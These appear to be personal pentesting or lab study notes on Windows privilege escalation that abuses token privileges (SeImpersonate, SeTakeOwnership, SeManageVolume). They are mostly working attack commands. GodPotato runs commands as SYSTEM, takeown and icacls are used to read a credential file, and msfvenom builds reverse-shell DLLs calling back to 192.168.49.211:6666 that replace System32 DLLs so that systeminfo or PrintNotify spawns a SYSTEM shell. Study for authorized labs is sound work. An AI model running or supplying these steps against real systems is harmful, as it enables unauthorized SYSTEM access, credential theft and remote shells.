https://github.com/gtworek/Priv2Admin

# SeImpersonatePrivileges
https://juggernaut-sec.com/seimpersonateprivilege/

If error occurs :-
- Execute `GetCLSID.ps1` script.
- Use `test_clsid.bat`

#### GodPotato
```cmd
# Check .NET version installed
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

# Accordingly, download the GodPotato on the target system
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse
```

# SeDebugPrivileges
By default the `SeBackupPrivilege` is *not enabled* in a *low-integrity shell*!

https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
OR
#backupoperators 


# SeTakeOwnershipPrivilege
Run this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) in **Powershell**
```powershell
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

```powershell
# Take ownership of a file
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
# Confirm ownership change
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

# Modify file ACL
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
cat 'C:\Department Shares\Private\IT\cred.txt'
```


# SeManageVolumePrivilege
## Technique 1
```cmd
# Run exploit
C:\Users\svc_mssql> .\SeManageVolumeExploit.exe
```
```sh
# Create malicious dll & replace it in C:\Windows\System32\wbem\
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.49.211 LPORT=6666 -f dll -o tzres.dll
```
```powershell
# Execute systeminfo (triggering malcious dll). We get a SYSTEM shell back to our listener
PS> systeminfo
```


## Technique 2
```cmd
# Run exploit
C:\Users\svc_mssql> .\SeManageVolumeExploit.exe
```
```sh
# Create malicious dll & replace it in C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.49.211 LPORT=6666 -f dll -o Printconfig.dll
```
```powershell
# Initiate the PrintNotify object by executing the following PowerShell commands
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
```